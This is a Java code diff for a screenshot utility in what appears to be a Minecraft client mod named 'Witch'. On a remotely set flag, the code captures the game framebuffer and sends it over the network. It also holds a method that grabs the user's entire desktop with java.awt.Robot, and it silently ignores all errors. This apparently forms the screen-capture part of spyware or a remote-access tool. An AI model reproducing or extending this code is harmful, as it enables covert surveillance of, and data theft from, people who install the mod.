@@ -9,7 +9,6 @@ import javax.imageio.ImageIO;
 import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
-import java.io.IOException;
 
 import static me.soda.witch.client.Witch.mc;
 
@@ -18,25 +17,19 @@ public class ScreenshotUtil {
 
     static {
         EventBus.INSTANCE.registerEvent(TickEvent.class, event -> {
-            try {
-                if (shouldTake) NetUtil.send("screenshot", ScreenshotUtil.takeScreenshot());
+            try (NativeImage image = ScreenshotRecorder.takeScreenshot(mc.getFramebuffer())) {
+                if (shouldTake) NetUtil.send("screenshot", image.getBytes());
                 shouldTake = false;
-            } catch (IOException ignored) {
+            } catch (Exception ignored) {
             }
         });
     }
 
-    public static byte[] takeScreenshot() throws IOException {
-        try (NativeImage nativeImage = ScreenshotRecorder.takeScreenshot(mc.getFramebuffer())) {
-            return nativeImage.getBytes();
-        }
-    }
-
-    public static void screenshot() {
+    public static void gameScreenshot() {
         shouldTake = true;
     }
 
-    public static byte[] screenshot2() throws Exception {
+    public static byte[] systemScreenshot() throws Exception {
         Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
         Rectangle screenRectangle = new Rectangle(screenSize);
         Robot robot = new Robot();
